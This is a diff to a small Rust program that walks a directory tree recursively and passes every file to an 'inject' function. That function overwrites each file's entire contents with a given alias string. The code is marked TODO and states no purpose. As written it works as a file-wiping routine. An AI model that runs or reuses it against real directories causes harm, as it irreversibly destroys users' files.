@@ -1,4 +1,4 @@
-use std::{env::args, path::Path};
+use std::{env::args, path::{Path, PathBuf}};
 
 #[allow(unused_must_use)]
 fn main() {
@@ -16,21 +16,25 @@ fn main() {
 
     let root_entries = std::fs::read_dir(&args[0]).unwrap().filter_map(|d| {
         if d.is_ok() {
-             let dir_name = d.ok().unwrap().file_name().into_string().unwrap();
-             if !filters.contains(&dir_name) { Some(dir_name)  } else { None }
+             let dir_ok = d.ok().unwrap();
+             if !filters.contains(&dir_ok.file_name().into_string().unwrap()) { Some(dir_ok.path())  } else { None }
         } else { None }
-    }).collect::<Vec<String>>();
+    }).collect::<Vec<PathBuf>>();
 
-    read_dir_recursively(&args[0], &args[1], &root_entries);
-}
+    for d in &root_entries {
+        read_dir_recursively(d, &args[1], &root_entries);
+    }
+ }
 
 #[allow(unused_must_use)]
-fn read_dir_recursively<P>(path: P, alias: &str, root_entries: &Vec<String>) -> Result<(), std::io::Error>
+fn read_dir_recursively<P, T>(path: P, alias: &str, root_entries: &Vec<T>) -> Result<(), std::io::Error>
 where
     P: AsRef<Path>,
+    T: AsRef<Path>
 {
    let directories = std::fs::read_dir(path)?.filter_map(|d| d.ok()).collect::<Vec<_>>();
      for d in directories {
+         println!("{:?}", d.file_name());
          let dir_metadata = d.metadata().unwrap();
             if dir_metadata.is_dir() { read_dir_recursively(d.path(), alias, &root_entries); } 
             else if dir_metadata.is_file() { inject(d.path(), alias); }
@@ -42,7 +46,7 @@ where
 #[allow(unused_must_use)]
 fn inject<P>(path: P, alias: &str) 
 where 
-    P: AsRef<Path> 
-{ 
+    P: AsRef<Path>
+{   
     std::fs::write(path, alias); // TODO
 }
